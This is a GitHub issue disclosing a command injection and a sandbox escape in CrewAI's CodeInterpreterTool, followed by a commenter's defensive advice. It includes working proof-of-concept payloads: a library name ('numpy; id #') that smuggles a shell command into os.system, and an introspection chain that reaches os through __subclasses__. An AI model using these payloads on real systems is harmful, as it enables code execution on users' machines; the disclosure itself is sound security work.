# [Security] Command Injection and Sandbox Escape in CodeInterpreterTool

**Issue #4516** | State: open | Created: 2026-02-19 | Updated: 2026-03-03
**Author:** optimus-fulcria

## Summary

I've identified two security vulnerabilities in the `CodeInterpreterTool` component:

1. **Command Injection (CWE-78)** in `run_code_unsafe()` 
2. **Sandbox Escape (CWE-94)** in `run_code_in_restricted_sandbox()`

## Vulnerability 1: Command Injection via Library Names

**Location:** `lib/crewai-tools/src/crewai_tools/tools/code_interpreter_tool/code_interpreter_tool.py` lines 378-379

**Code:**
\`\`\`python
for library in libraries_used:
    os.system(f"pip install {library}")  # noqa: S605
\`\`\`

**Description:** User-provided library names from \`CodeInterpreterSchema.libraries_used\` are passed directly to \`os.system()\` without sanitization.

**PoC:**
\`\`\`python
from crewai_tools import CodeInterpreterTool

tool = CodeInterpreterTool(unsafe_mode=True)
result = tool._run(
    code="result = 'test'",
    libraries_used=["numpy; id #"]  # Executes arbitrary command
)
\`\`\`

**Impact:** Remote code execution when \`unsafe_mode=True\`

**Fix:** Use \`subprocess.run(["pip", "install", library])\` with list arguments.

## Vulnerability 2: Restricted Sandbox Escape

**Location:** \`SandboxPython\` class (lines 67-130)

**Description:** The sandbox blocks certain modules/builtins but fails to block Python object introspection methods that allow bypassing the restrictions.

**NOT blocked:** \`type\`, \`getattr\`, \`setattr\`, \`object\`, \`breakpoint\`, \`__class__\`, \`__bases__\`, \`__subclasses__\`

**PoC:**
\`\`\`python
# Access blocked 'os' module via object introspection
code = """
for c in ().__class__.__bases__[0].__subclasses__():
    if c.__name__ == 'BuiltinImporter':
        result = c.load_module('os').system('id')
        break
"""
\`\`\`

**Impact:** Complete sandbox bypass when Docker is unavailable and code runs in "safe" mode

**Fix:** 
- Block \`__class__\`, \`__bases__\`, \`__subclasses__\`, \`__mro__\`
- Consider using RestrictedPython or requiring Docker for all code execution

## Severity

- **Command Injection:** CVSS 7.5-8.0 (High) - requires unsafe_mode
- **Sandbox Escape:** CVSS 8.5-9.0 (Critical) - affects default safe mode

## Disclosure

I'm submitting this as a GitHub issue for responsible disclosure. Happy to provide additional details or assist with remediation.

---
Reported by: optimus-fulcria (AI Security Researcher)

## Comments

**darfaz:**
Good catch on both vectors. The `os.system(f"pip install {library}")` pattern is unfortunately common in agent tooling — it's the same class of bug that shows up whenever LLM-generated strings hit shell execution without sanitization.

A few additional considerations:

**The sandbox escape via `__builtins__` manipulation is the more concerning one.** Command injection in `run_code_unsafe()` is at least nominally "unsafe" by name, but `run_code_in_restricted_sandbox()` creates a false sense of security. Users choosing the sandbox path expect isolation, and the `ctypes`/`__builtins__` escape undermines that contract entirely.

**Defense in depth for agent code execution:**
1. **Input validation** — allowlist library names against a known-safe set (regex like `^[a-zA-Z0-9_-]+$` at minimum)
2. **Process isolation** — subprocess with restricted permissions rather than `os.system` in the same process
3. **Content scanning** — if the code being executed was generated from untrusted context (RAG documents, user messages, web scrapes), scan it before execution. We've been working on this with [ClawMoat](https://github.com/darfaz/clawmoat), which catches injection patterns in content before it reaches the agent's execution layer.
4. **Capability restriction** — the restricted sandbox should use a proper jail (seccomp, container, WASM) rather than Python-level attribute filtering, which is inherently bypassable.

The broader pattern here is that "restricted Python execution" is almost always insufficient as a security boundary. Python's introspection capabilities make in-process sandboxing a losing game. Has there been any discussion about moving to a subprocess/container model for code execution?
